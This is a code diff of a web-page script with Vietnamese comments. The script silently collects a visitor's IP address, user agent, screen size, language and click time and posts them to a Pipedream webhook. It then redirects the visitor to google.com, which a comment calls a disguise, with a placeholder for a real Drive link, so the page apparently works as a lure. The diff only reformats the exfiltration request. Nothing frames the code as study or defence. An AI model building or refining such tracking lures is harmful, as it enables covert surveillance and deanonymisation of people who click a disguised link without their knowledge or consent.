@@ -1,30 +1,28 @@
 <script>
     async function collectExpertData() {
         try {
-            // 1. Lấy IP từ dịch vụ công cộng
+            // 1. Lấy IP
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
 
-            // 2. Thu thập bộ thông tin tối đa trình duyệt cho phép
-            const payload = {
-                ip: ipData.ip,
-                device: navigator.userAgent, // Tên máy, hệ điều hành, trình duyệt
-                language: navigator.language, // Ngôn ngữ máy
-                screen: window.screen.width + "x" + window.screen.height, // Độ phân giải màn hình
-                time: new Date().toLocaleString(), // Thời gian nhấn vào
-                platform: navigator.platform // Nền tảng hệ thống
-            };
+            // 2. Thu thập dữ liệu
+            const params = new URLSearchParams();
+            params.append('ip', ipData.ip);
+            params.append('device', navigator.userAgent);
+            params.append('screen', window.screen.width + "x" + window.screen.height);
+            params.append('language', navigator.language);
+            params.append('time', new Date().toLocaleString());
 
-            // 3. Gửi về Pipedream bí mật
+            // 3. Gửi về Pipedream bằng phương thức POST mạnh nhất
             fetch('https://eo8z560mmcz7078.m.pipedream.net', {
                 method: 'POST',
-                mode: 'no-cors', 
-                body: JSON.stringify(payload)
+                body: params, // Gửi dạng form-data giúp Pipedream dễ bóc tách
+                mode: 'no-cors' 
             });
 
             // 4. Chuyển hướng để ngụy trang
             setTimeout(() => {
-                window.location.href = "https://google.com"; // Thay link tài liệu thật vào đây
+                window.location.href = "https://google.com"; // Thay link Drive thật vào đây
             }, 2000);
 
         } catch (e) {
